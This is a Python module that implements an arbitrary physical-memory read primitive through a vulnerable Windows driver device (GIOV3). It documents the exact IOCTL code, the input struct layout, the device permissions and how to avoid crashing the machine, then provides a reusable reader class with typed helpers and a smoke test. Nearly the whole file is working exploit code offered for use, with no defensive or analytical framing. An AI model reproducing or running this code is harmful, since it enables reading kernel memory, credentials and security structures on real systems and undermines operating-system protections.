"""Arbitrary physical-memory read over the gdrv3 driver (\\\\.\\GIOV3).

Verified primitive: IOCTL 0xC3502014 takes
    struct { u64 phys; u32 size; u32 pad; void *dst; }   (24 bytes in)
and does memcpy(dst, MmMapIoSpace(phys, size), size).  `phys` is a BYTE address
(confirmed: reads at +4/+8 shift the data by exactly 4/8 bytes), `size` is
honoured exactly, and the IOCTL reports Information == 0 so out_len can be 0.

Two hard rules learned the hard way:
  * The device DACL is D:P(A;;GA;;;SY)(A;;GA;;;BA) -- only SYSTEM/Administrators
    can open it, so an unelevated open fails with ERROR_ACCESS_DENIED (5).
  * The driver maps raw physical pages without validating that the range is
    backed RAM.  Reading an unbacked/MMIO hole bugchecks the machine, so resolve
    a physical address (page tables, PDB, pool pointers) before reading it.

Throughput measured on this box: ~95 MiB/s in 4 KiB chunks.
"""
import ctypes
import struct

import elev_probe as E

IOCTL_READ = 0xC3502014
IOCTL_ECHO = 0xC3502400   # decoy: echoes in->phys into the out buffer only
PAGE = 0x1000


class PhysReader(object):
    """Open \\\\.\\GIOV3 once, read physical ranges repeatedly."""

    def __init__(self, path=r"\\.\GIOV3", chunk=PAGE):
        self.path = path
        self.chunk = chunk
        self.h = E.k32.CreateFileW(path, E.GENERIC_READ | E.GENERIC_WRITE, 0,
                                   None, E.OPEN_EXISTING, 0, None)
        if not self.h or self.h == ctypes.c_void_p(-1).value:
            raise OSError(ctypes.get_last_error(),
                          "CreateFileW %s failed (need elevation)" % path)
        self.dst = E.alloc_locked(chunk)
        self.reads = 0

    # -- core -------------------------------------------------------------
    def _read_one(self, phys, size):
        ib = ctypes.create_string_buffer(0x20)
        struct.pack_into("<QII", ib, 0, phys & 0xFFFFFFFFFFFFFFFF, size, 0)
        struct.pack_into("<Q", ib, 0x10, self.dst)
        ob = ctypes.create_string_buffer(1)
        ret = ctypes.c_ulong(0)
        ok = E.k32.DeviceIoControl(self.h, IOCTL_READ, ib, 0x18, ob, 0,
                                   ctypes.byref(ret), None)
        if not ok:
            raise OSError(ctypes.get_last_error(),
                          "phys read %#x+%#x failed" % (phys, size))
        self.reads += 1
        return ctypes.string_at(self.dst, size)

    def read(self, phys, size):
        """Read `size` bytes starting at physical byte address `phys`."""
        out = bytearray()
        left = size
        cur = phys
        while left:
            n = min(left, self.chunk)
            out += self._read_one(cur, n)
            cur += n
            left -= n
        return bytes(out)

    # -- typed helpers ----------------------------------------------------
    def u16(self, phys):
        return struct.unpack("<H", self.read(phys, 2))[0]

    def u32(self, phys):
        return struct.unpack("<I", self.read(phys, 4))[0]

    def u64(self, phys):
        return struct.unpack("<Q", self.read(phys, 8))[0]

    def ptr(self, phys, size=8):
        """Read a pointer-sized value; returns (value, as physical address)."""
        return struct.unpack("<Q" if size == 8 else "<I",
                             self.read(phys, size))[0]

    # -- lifetime ---------------------------------------------------------
    def close(self):
        if self.dst:
            E.k32.VirtualFree(self.dst, 0, E.MEM_RELEASE)
            self.dst = None
        if self.h:
            E.k32.CloseHandle(self.h)
            self.h = None

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        self.close()


def phys_read(phys, size):
    """One-shot read convenience wrapper."""
    with PhysReader() as r:
        return r.read(phys, size)


if __name__ == "__main__":
    # smoke test: byte 0 of RAM + the bogus-0x2400 check, no sweep.
    # Writes physread.txt because elevated children lose their console.
    import os
    lines = ["elevation: %s" % (E.elevation(),)]
    with PhysReader() as r:
        lines.append("phys 0x0    : %s" % r.read(0, 16).hex())
        lines.append("phys 0xffff0: %s (reset vector)"
                     % r.read(0xFFFF0, 16).hex())
        lines.append("u32 @0x1000 : %#x reads=%d" % (r.u32(0x1000), r.reads))
    path = os.path.join(E.HERE, "physread.txt")
    open(path, "w", encoding="utf-8").write("\n".join(lines) + "\n")
    print("\n".join(lines))
